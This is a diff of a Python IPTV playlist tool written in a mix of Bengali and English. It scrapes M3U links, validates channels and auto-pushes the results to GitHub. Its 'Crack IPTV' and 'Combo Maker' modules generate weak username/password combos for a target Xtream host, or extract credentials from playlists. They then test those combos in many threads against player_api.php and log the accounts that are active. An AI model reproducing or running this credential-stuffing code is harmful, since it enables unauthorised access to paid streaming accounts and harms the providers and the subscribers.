@@ -3,199 +3,151 @@ import os
 import re
 import concurrent.futures
 import threading
-import json
 import subprocess
 from datetime import datetime
 from rich.console import Console
-from rich.table import Table
 from rich.panel import Panel
 
 console = Console()
 
-# --- Configs ---
+# --- Files ---
 OUTPUT_DIR = "output"
 ALL_SOURCE_TXT = "allsource.txt"
 CRACK_FILE = "crack.txt"
 COMBO_FILE = "iptv_combo.txt"
 
-class SM_IPTV_Supreme:
+class SM_IPTV_Ultimate:
     def __init__(self):
-        self.hits = 0
         self.lock = threading.Lock()
         os.makedirs(OUTPUT_DIR, exist_ok=True)
 
     def banner(self):
         os.system('clear')
-        banner = """
-[bold cyan]╔══════════════════════════════════════════════════════════════╗
-║                ⚡ SM IPTV CUSTOMIZE SUPREME ⚡               ║
-║           [white]Final Fixed | No Error | Ultra Advance[/white]          ║
-╚══════════════════════════════════════════════════════════════╝[/bold cyan]
-"""
-        console.print(banner)
+        console.print(Panel.fit("[bold cyan]⚡ SM IPTV SUPREME FINAL FIX ⚡[/bold cyan]\n[white]Validation Mode | Dynamic Category | Auto-Sync[/white]"))
+
+    def check_link_status(self, link):
+        """Playable kina check korbe (Status 200/302)"""
+        try:
+            r = requests.head(link, timeout=5, allow_redirects=True)
+            return r.status_code in [200, 302]
+        except: return False
 
     def github_sync(self):
-        """Auto push without getting stuck in login prompt"""
         if os.path.exists(".git"):
-            try:
-                console.print("[dim][*] Updating GitHub... (Make sure PAT is configured)[/dim]")
-                # Using --force and checking for errors
-                subprocess.run("git add . && git commit -m 'Auto-Update' && git push -u origin main", shell=True)
-            except:
-                console.print("[red][!] GitHub Sync Failed. Please login to Git manually once.[/red]")
+            console.print("[dim][*] Syncing GitHub...[/dim]")
+            subprocess.run("git add . && git commit -m 'Update' && git push -u origin main", shell=True)
 
-    def parse_m3u(self, urls_str):
-        """Strong parser for multiple comma separated links"""
+    def parse_and_validate(self, urls_str):
         all_channels = []
-        # Split by comma and clean spaces
         urls = [u.strip() for u in urls_str.split(",") if u.strip()]
         
         for url in urls:
             try:
-                console.print(f"[dim][~] Loading: {url[:50]}...[/dim]")
-                r = requests.get(url, timeout=20)
-                if r.status_code == 200:
-                    content = r.text
-                    # regex to get group, name and link strictly
-                    matches = re.findall(r'#EXTINF:.*?(?:group-title="(.*?)")?.*?,(.*?)\n(http.*?)(?:\n|$)', content)
-                    for cat, name, link in matches:
-                        cat = cat if cat else "Others"
-                        # Filter Adult content as per your request
-                        if not any(x in name.lower() for x in ["adult", "sex", "porn", "xxx", "18+"]):
-                            all_channels.append({"cat": cat, "name": name.strip(), "link": link.strip()})
-                else:
-                    console.print(f"[red][!] Error {r.status_code} for link.[/red]")
-            except Exception as e:
-                console.print(f"[red][!] Connection Error for link.[/red]")
+                console.print(f"[yellow][~] Scanning Link...[/yellow]")
+                r = requests.get(url, timeout=15).text
+                # Category parsing (group-title or #EXTGRP)
+                matches = re.findall(r'#EXTINF:.*?(?:group-title="(.*?)")?.*?,(.*?)\n(?:#EXTGRP:(.*?)\n)?(http.*?)(?:\n|$)', r)
+                
+                for group1, name, group2, link in matches:
+                    category = group1 or group2 or "General"
+                    # No Adult
+                    if any(x in name.lower() or x in category.lower() for x in ["adult", "sex", "xxx", "porn"]):
+                        continue
+                        
+                    # Validation: Shudu cholbe segulo nibe
+                    if self.check_link_status(link.strip()):
+                        all_channels.append({"cat": category.strip(), "name": name.strip(), "link": link.strip()})
+            except: pass
         return all_channels
 
-    # --- 1. All Channel ---
-    def all_channel_export(self, urls_str):
-        channels = self.parse_m3u(urls_str)
+    def all_channel_update(self, urls_str):
+        channels = self.parse_and_validate(urls_str)
         path = os.path.join(OUTPUT_DIR, "all_channels.m3u")
-        
-        existing_links = set()
-        if os.path.exists(path):
-            with open(path, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))
-
-        with open(path, "a", encoding="utf-8") as f:
-            if not existing_links: f.write("#EXTM3U\n")
-            for ch in channels:
-                if ch['link'] not in existing_links:
-                    f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
-                    existing_links.add(ch['link'])
-        
-        console.print(f"[green]✔ Total {len(channels)} unique channels processed.[/green]")
+        with open(path, "w", encoding="utf-8") as f:
+            f.write("#EXTM3U\n")
+            for ch in channels: f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
+        console.print(f"[green]✔ {len(channels)} Valid channels updated.[/green]")
         self.github_sync()
 
-    # --- 2. Custom Channel (Dynamic Serial) ---
-    def custom_folder_export(self, urls_str):
-        channels = self.parse_m3u(urls_str)
-        categories = sorted(list(set([ch['cat'] for ch in channels])))
+    def custom_category_update(self, urls_str):
+        channels = self.parse_and_validate(urls_str)
+        cats = sorted(list(set([ch['cat'] for ch in channels])))
         
-        console.print("\n[bold yellow]Available Categories:[/bold yellow]")
-        for i, cat in enumerate(categories, 1):
-            print(f"{i}. {cat}")
+        console.print("\n[bold cyan]Select Categories to Update (Serial):[/bold cyan]")
+        for i, c in enumerate(cats, 1): print(f"{i}. {c}")
         
-        selection = input("\nEnter Numbers (e.g., 125): ")
-        selected_indices = [int(i)-1 for i in selection if i.isdigit() and 0 < int(i) <= len(categories)]
+        choice = input("\nEnter Numbers (e.g. 123): ")
+        indices = [int(i)-1 for i in choice if i.isdigit() and 0 < int(i) <= len(cats)]
 
-        for idx in selected_indices:
-            cat_name = categories[idx]
-            cat_file = os.path.join(OUTPUT_DIR, f"{cat_name.replace(' ', '_')}.m3u")
-            
-            existing_links = set()
-            if os.path.exists(cat_file):
-                with open(cat_file, "r") as f: existing_links = set(re.findall(r'http[^\s]+', f.read()))
-
-            with open(cat_file, "a", encoding="utf-8") as f:
-                if not existing_links: f.write("#EXTM3U\n")
-                for ch in channels:
-                    if ch['cat'] == cat_name and ch['link'] not in existing_links:
-                        f.write(f"#EXTINF:-1,{ch['name']}\n{ch['link']}\n")
-                        existing_links.add(ch['link'])
-            console.print(f"[green]✔ {cat_name} category updated.[/green]")
+        for idx in indices:
+            c_name = cats[idx]
+            f_name = os.path.join(OUTPUT_DIR, f"{c_name.replace(' ','_')}.m3u")
+            filtered = [f"#EXTINF:-1,{ch['name']}\n{ch['link']}" for ch in channels if ch['cat'] == c_name]
+            with open(f_name, "w", encoding="utf-8") as f:
+                f.write("#EXTM3U\n" + "\n".join(filtered))
+            console.print(f"[green]✔ {c_name} updated.[/green]")
         self.github_sync()
 
-    # --- 5. Crack IPTV (Fixed) ---
-    def check_worker(self, combo):
+    def source_copy(self):
+        url = input("Enter M3U Link: ")
         try:
-            if "/get.php?" not in combo: return
+            r = requests.get(url).text
+            with open("allsource.txt", "w") as f: f.write(r)
+            console.print("[green]✔ Saved to allsource.txt[/green]")
+        except: print("Error!")
+
+    def crack_worker(self, combo):
+        try:
             base = combo.split("/get.php")[0]
-            params = combo.split("?")[1]
-            api = f"{base}/player_api.php?{params}"
-            
-            r = requests.get(api, timeout=10).json()
-            if r.get("user_info", {}).get("status") == "Active":
-                exp = r["user_info"].get("exp_date")
-                exp_date = datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d') if exp else "Unlimited"
-                
-                # Success details
-                info = f"URL: {combo} | Exp: {exp_date} | Active"
+            api = f"{base}/player_api.php?{combo.split('?')[1]}"
+            res = requests.get(api, timeout=10).json()
+            if res.get("user_info", {}).get("status") == "Active":
+                info = f"HIT: {combo} | Exp: {res['user_info'].get('exp_date','N/A')}"
                 with self.lock:
-                    self.hits += 1
                     with open(CRACK_FILE, "a") as f: f.write(info + "\n")
-                console.print(f"[bold green][SUCCESS] {info}[/bold green]")
+                console.print(f"[bold green]{info}[/bold green]")
         except: pass
 
-    # --- 6. Combo Maker (Ultra Advance) ---
-    def combo_maker(self):
+    def combo_maker_advance(self):
         self.banner()
-        print("1. Auto Generate (Domain/Pattern based)")
-        print("2. Custom (Extract from M3U link/file)")
-        c = input("\nChoice: ")
-        
+        print("1. Auto (Pattern) | 2. Custom (Extract)")
+        c = input("Choice: ")
         if c == "1":
-            link = input("Enter Xtream Link (Host): ")
-            prefix = input("Enter Name Pattern (e.g., Jahid): ")
-            try:
-                host = re.search(r'(http://[^\s/:]+:\d+)', link).group(1)
-                combos = set()
-                # Advance years and common pass patterns
-                for year in range(2023, 2027):
-                    u = f"{prefix}{year}"
-                    for p in [u, f"{prefix}123", f"{prefix}2025", "123456", "123123"]:
-                        combos.add(f"{host}/get.php?username={u}&password={p}&type=m3u_plus")
-                with open(COMBO_FILE, "w") as f:
-                    for line in combos: f.write(line + "\n")
-                console.print(f"[green]✔ {len(combos)} Advance combos saved in {COMBO_FILE}[/green]")
-            except: print("Invalid Link.")
-            
+            link = input("Enter Xtream Host Link: ")
+            name = input("Target Name: ")
+            host = re.search(r'(http://[^\s/:]+:\d+)', link).group(1)
+            with open(COMBO_FILE, "w") as f:
+                for i in range(2024, 2027):
+                    u = f"{name}{i}"
+                    for p in [u, f"{name}123", "123456", "0000"]:
+                        f.write(f"{host}/get.php?username={u}&password={p}&type=m3u_plus\n")
+            print("✔ Combo Made.")
         elif c == "2":
-            source = input("Enter M3U Link or File Path: ")
-            data = ""
-            if source.startswith("http"): data = requests.get(source).text
-            elif os.path.exists(source): data = open(source, 'r', errors='ignore').read()
-            
+            path = input("M3U Path/Link: ")
+            data = requests.get(path).text if path.startswith("http") else open(path).read()
             matches = re.findall(r'(http://[^\s/:]+:\d+)/get\.php\?username=([^\s&]+)&password=([^\s&]+)', data)
-            unique = set([f"{h}/get.php?username={u}&password={p}&type=m3u_plus" for h, u, p in matches])
-            with open(COMBO_FILE, "w") as out:
-                for line in unique: out.write(line + "\n")
-            console.print(f"[green]✔ {len(unique)} Combos Extracted.[/green]")
+            with open(COMBO_FILE, "w") as f:
+                for h, u, p in set(matches): f.write(f"{h}/get.php?username={u}&password={p}&type=m3u_plus\n")
+            print(f"✔ {len(matches)} Extracted.")
 
     def menu(self):
         while True:
             self.banner()
-            print("1. All Channel (Clean)")
-            print("2. Custom Folder (Dynamic Category)")
-            print("3. Source Code Copy (to allsource.txt)")
-            print("4. Source All (Manual Sync)")
-            print("5. Crack IPTV (Fixed Checker)")
-            print("6. Combo Maker (Advanced)")
-            print("0. Exit")
-            
+            print("1. All Channel (Valid Only)\n2. Custom Folder (Serial)\n3. Source Copy (allsource.txt)\n4. Source All (Manual Push)\n5. Crack IPTV (Checker)\n6. Combo Maker (Advanced)\n0. Exit")
             opt = input("\n[>] Choice: ")
-            if opt == "1": self.all_channel_export(input("Enter M3U Links: "))
-            elif opt == "2": self.custom_folder_export(input("Enter M3U Links: "))
+            if opt == "1": self.all_channel_update(input("Links: "))
+            elif opt == "2": self.custom_category_update(input("Links: "))
+            elif opt == "3": self.source_copy()
+            elif opt == "4": self.github_sync()
             elif opt == "5":
-                p = input("Combo Path: ")
+                p = input("Combo Path: ").strip()
                 if os.path.exists(p):
-                    links = open(p, "r").read().splitlines()
-                    console.print(f"[yellow][*] Scanning {len(links)} accounts...[/yellow]")
-                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex: ex.map(self.check_worker, links)
-            elif opt == "6": self.combo_maker()
+                    links = open(p).read().splitlines()
+                    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex: ex.map(self.crack_worker, links)
+                else: print("File Not Found!")
+            elif opt == "6": self.combo_maker_advance()
             elif opt == "0": break
-            input("\nPress Enter to Menu...")
+            input("\nEnter...")
 
 if __name__ == "__main__":
-    SM_IPTV_Supreme().menu()
+    SM_IPTV_Ultimate().menu()
